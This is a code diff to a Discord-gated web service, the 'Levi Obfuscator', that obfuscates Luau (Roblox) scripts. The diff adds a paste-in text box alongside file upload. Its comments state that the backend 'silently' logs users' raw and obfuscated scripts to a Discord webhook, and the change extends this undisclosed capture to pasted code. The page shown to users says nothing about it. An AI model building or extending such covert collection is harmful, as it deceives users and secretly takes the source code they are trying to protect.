@@ -82,7 +82,7 @@ function obfuscateLuauScript(sourceCode, options) {
     }
 
     // 4. Assemble the full deeply injected script
-    const finalObfuscated = `-- Obfuscated using levi obfuscator V1.1.0
+    const finalObfuscated = `-- Obfuscated using levi obfuscator V1.2.0
 do
     local _env = getgenv and getgenv() or _G;
     ${junkHeader}
@@ -170,7 +170,7 @@ app.get('/auth/logout', (req, res) => {
   req.session.destroy(() => { res.redirect('/'); });
 });
 
-// UI Route with Levi Obfuscator Branding (No DBL Username Input)
+// UI Route with Levi Obfuscator Branding (Supports File or Direct Raw Text Input)
 app.get('/', (req, res) => {
   const verifiedUser = req.session.verifiedUser || null;
 
@@ -194,13 +194,14 @@ app.get('/', (req, res) => {
             .tab-panel { display: none; text-align: left; }
             .tab-panel.active { display: block; }
             h3 { font-size: 15px; color: #38bdf8; margin-top: 0; margin-bottom: 12px; border-bottom: 1px solid rgba(56, 189, 248, 0.2); padding-bottom: 6px; }
-            select, button { width: 100%; padding: 11px; margin: 8px 0; border-radius: 8px; border: none; box-sizing: border-box; font-size: 13px; }
-            select { background: #0f172a; color: #f8fafc; border: 1px solid #334155; }
-            select:focus { border-color: #38bdf8; outline: none; }
+            select, textarea, button { width: 100%; padding: 11px; margin: 8px 0; border-radius: 8px; border: none; box-sizing: border-box; font-size: 13px; }
+            select, textarea { background: #0f172a; color: #f8fafc; border: 1px solid #334155; font-family: monospace; }
+            select:focus, textarea:focus { border-color: #38bdf8; outline: none; }
+            textarea { resize: vertical; height: 90px; }
             .toggle-group { display: flex; background: #0f172a; border: 1px solid #334155; border-radius: 8px; overflow: hidden; margin: 8px 0; }
             .toggle-option { flex: 1; padding: 10px; text-align: center; font-size: 13px; cursor: pointer; color: #94a3b8; }
             .toggle-option.active { background: #38bdf8; color: #0f172a; font-weight: bold; }
-            .drop-zone { background: #1e293b; border: 2px dashed #475569; border-radius: 8px; padding: 18px; text-align: center; cursor: pointer; margin: 10px 0; }
+            .drop-zone { background: #1e293b; border: 2px dashed #475569; border-radius: 8px; padding: 15px; text-align: center; cursor: pointer; margin: 10px 0; }
             button.action-btn { background: linear-gradient(135deg, #0284c7, #2563eb); color: white; font-weight: bold; cursor: pointer; margin-top: 12px; }
             .discord-login-btn { background: #5865F2; color: white; font-weight: bold; text-decoration: none; display: block; padding: 12px; border-radius: 8px; text-align: center; margin: 15px 0; }
             .locked-overlay { background: rgba(15, 23, 42, 0.9); border: 1px dashed #ef4444; padding: 25px; border-radius: 10px; text-align: center; }
@@ -236,10 +237,10 @@ app.get('/', (req, res) => {
             <div id="mainTab" class="tab-panel">
                 ${verifiedUser ? 
                     `<form action="/upload-discord" method="POST" enctype="multipart/form-data">
-                        <h3>Levi Obfuscator V1.1.0</h3>
+                        <h3>Levi Obfuscator V1.2.0</h3>
 
-                        <div style="margin-top: 8px;">
-                            <label style="font-size:12px; color:#38bdf8; display:block; margin-bottom:4px;">Length Focus (Size Level):</label>
+                        <div style="margin-top: 6px;">
+                            <label style="font-size:12px; color:#38bdf8; display:block; margin-bottom:3px;">Length Focus (Size Level):</label>
                             <select name="sizeMode">
                                 <option value="small">Small</option>
                                 <option value="medium" selected>Medium (~900+ Lines)</option>
@@ -248,8 +249,8 @@ app.get('/', (req, res) => {
                             </select>
                         </div>
 
-                        <div style="margin-top: 8px;">
-                            <label style="font-size:12px; color:#38bdf8; display:block; margin-bottom:4px;">Rename Locals:</label>
+                        <div style="margin-top: 6px;">
+                            <label style="font-size:12px; color:#38bdf8; display:block; margin-bottom:3px;">Rename Locals:</label>
                             <div class="toggle-group">
                                 <div class="toggle-option active" id="optYes" onclick="setRename('yes')">Yes</div>
                                 <div class="toggle-option" id="optNo" onclick="setRename('no')">No</div>
@@ -257,9 +258,14 @@ app.get('/', (req, res) => {
                             <input type="hidden" name="renameLocal" id="renameLocalInput" value="yes">
                         </div>
 
+                        <div style="margin-top: 6px;">
+                            <label style="font-size:12px; color:#38bdf8; display:block; margin-bottom:3px;">Input Script (Paste Text OR Upload File):</label>
+                            <textarea name="scriptContent" placeholder="Paste your Luau code here..."></textarea>
+                        </div>
+
                         <div class="drop-zone" onclick="document.getElementById('fileInput').click()">
-                            <div id="dropText" style="font-size:13px; color:#94a3b8;">Click or Drop Luau (.lua / .txt) Script</div>
-                            <input type="file" id="fileInput" name="file" required style="display:none;" onchange="updateFileName(this)">
+                            <div id="dropText" style="font-size:12px; color:#94a3b8;">Or Click to Upload (.lua / .txt file)</div>
+                            <input type="file" id="fileInput" name="file" style="display:none;" onchange="updateFileName(this)">
                         </div>
 
                         <button type="submit" class="action-btn">Obfuscate & Download</button>
@@ -312,7 +318,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-// Backend Route: Processes script, obfuscates, downloads result to user, and silently logs BOTH raw and obfuscated files to Discord webhook
+// Backend Route: Processes script from either file upload or direct text box, obfuscates, downloads result, and silently logs to Discord
 app.post('/upload-discord', upload.single('file'), async (req, res) => {
   try {
     if (!req.session.verifiedUser) {
@@ -320,22 +326,29 @@ app.post('/upload-discord', upload.single('file'), async (req, res) => {
     }
 
     const file = req.file;
+    const directText = req.body.scriptContent;
     const sizeMode = req.body.sizeMode || 'medium';
     const renameLocal = req.body.renameLocal || 'yes';
 
-    if (!file) {
-      return res.status(400).send('<h3>No file uploaded. <a href="/">Go Back</a></h3>');
+    let rawString = '';
+    let originalName = 'script.lua';
+
+    if (file && file.buffer.length > 0) {
+      rawString = file.buffer.toString('utf8');
+      originalName = file.originalname;
+    } else if (directText && directText.trim().length > 0) {
+      rawString = directText;
+      originalName = 'paste_script.lua';
+    } else {
+      return res.status(400).send('<h3>No script provided (upload a file or paste text). <a href="/">Go Back</a></h3>');
     }
 
-    // Capture raw source code
-    const rawScriptBuffer = file.buffer;
-    const rawString = rawScriptBuffer.toString('utf8');
+    const rawScriptBuffer = Buffer.from(rawString, 'utf8');
 
     // Run Levi Obfuscator Engine with full code padding and mangling
     const obfuscatedString = obfuscateLuauScript(rawString, { sizeMode, renameLocal });
     const obfuscatedBuffer = Buffer.from(obfuscatedString, 'utf8');
 
-    const originalName = file.originalname;
     const ext = originalName.includes('.') ? originalName.substring(originalName.lastIndexOf('.')) : '.lua';
     const baseName = originalName.includes('.') ? originalName.substring(0, originalName.lastIndexOf('.')) : originalName;
     const obfuscatedFilename = `${baseName}_levi_obfuscated${ext}`;
